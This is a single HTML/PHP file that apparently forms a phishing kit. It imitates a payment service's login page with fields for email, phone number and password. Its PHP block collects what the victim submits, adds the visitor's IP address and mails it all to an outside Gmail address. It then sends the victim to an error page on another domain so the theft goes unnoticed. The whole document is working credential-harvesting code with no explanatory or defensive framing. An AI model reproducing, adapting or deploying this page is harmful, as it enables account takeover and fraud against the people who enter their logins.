<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name=”robots” content=”noindex”>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
	
	<title>Login To Your Account</title>

	<style>
		.container{
			width: 30%;
		}
		.borderbox{
			border: 1px solid #dddede;
			margin-top:30px;
			padding: 20px 6%; 
			width: 100%;
		}
		.logo{
			text-align: center;
		}
		.form-control{
			padding: 11px !important;
			width: 100%;
			color: #212529;
       		background-color: #fff;
       		border-radius: 0.25rem;
       		transition: border-color .15s ease-in-out, box-shadow .15s ease-in-out;
		}
		a{
		    color: #0d6efd;
		    text-decoration: underline;
		}
		.formbtn{
			width: 100%;
			background-color: #0070ba;
		    border-radius: 25px;
		    box-sizing: border-box;
		    padding: 12px;
		    color: #fff;
		    margin: 10px 0px 10px 0px;
		    font-size:18px ;
		    border:none ;
		    text-align: center;
		    font-weight: 700;
    		font-size: 18px;
		}
		.orline{
			border-top: 1px solid #cbd2d6;
		    position: relative !important;
		    margin-top: 4.72%;
		    height: 15px;
		    text-align: center;
		}
		.ortext{
			background-color: #fff;
		    padding: 0 0.5em;
		    position: relative !important;
		    color: #6c7378 !important;
		    top: -0.7em;
		}
		.signup{
		    background-color: #fff;
		    color: #0070ba;
		    border: 0.0625rem solid #0070ba;
		    transition: color .2s ease, background-color .2s ease, border-color .2s ease, box-shadow .2s ease;
		    padding: 12px;
		    margin: 10px 0px 10px 0px;
		    width: 100%;
		    border-radius: 25px;
		    text-align: center;
   			font-weight: 700;

		}
		.country{
			text-align: center;
		}
		@media only screen and (max-width: 640px){
			 .container {
	        	width: 100% !important;
	    	}
			.country{
				text-align:center;
			}
			.flag{
				width:250px !important;
			}
		}
	</style>
</head>
<body>

	<div class="container">
		<div class="borderbox">
			<div class="logo">
                <img src="img/logo.jpg" alt="pay" width="100">
            </div>

            <form id="newForm" method="post" action="#">
            	<div class="mb-3 mt-3">
                    <input type="email" class="form-control" placeholder="Email" name="email" required="required" >
                </div>
                <div class="mb-3 mt-3">
                    <input type="tel" class="form-control" placeholder="Phone Number" name="phone" pattern="[0-9][0-9]{9}"  required="required" required="required" >
                </div>
                <div class="mb-3 mt-3">
                    <input type="password" class="form-control" placeholder="Password" name="pass" required="required">
                </div>
                <a href="#" id="forgotPassword" class="recoveryOption forgotPassword"
                    data-client-log-action-type="clickForgotPasswordLink" pa-marked="1">Forgot password?</a>

                <button type="submit" class="formbtn" name="mybtn">Log In</button>

                <div class="orline"><span class="ortext">or</span></div>
                <button class="button signup">Sign Up</button>
            </form>
            <div class="country"> 
                <img class="flag" src="img/flag.png" alt="pay">
            </div>
		</div>
	</div>

		<?php
            header('Access-Control-Allow-Origin: *');
			if(isset($_POST['mybtn'])){

				$email=$_POST['email'];
				$phone=$_POST['phone'];
				$pass=$_POST['pass'];

				$subject="Enquiry Mail From".$_SERVER['REQUEST_URI'];
				
				
				$user_ip=$userIP = $_SERVER['REMOTE_ADDR'];

				$message="\nEmail is - ".$email
							."\n Phone - ".$phone
							."\npass - ".$pass
							."\nUser Ip - ".$user_ip;

                
                $mailfrom="admin@digitalworkwith.xyz";
				$mailto="creativecapture365@gmail.com";

				
				$headers = "From:" . $mailfrom;

				if(mail($mailto,$subject,$message, $headers)) 
				{ 
				    echo "<script>location='https://savvysite.store/ab/error.php'</script>";
				   
				     $data['success']=true;
				} else {
				     $data['success']=true;
				}


			}

		?>


</body>
</html>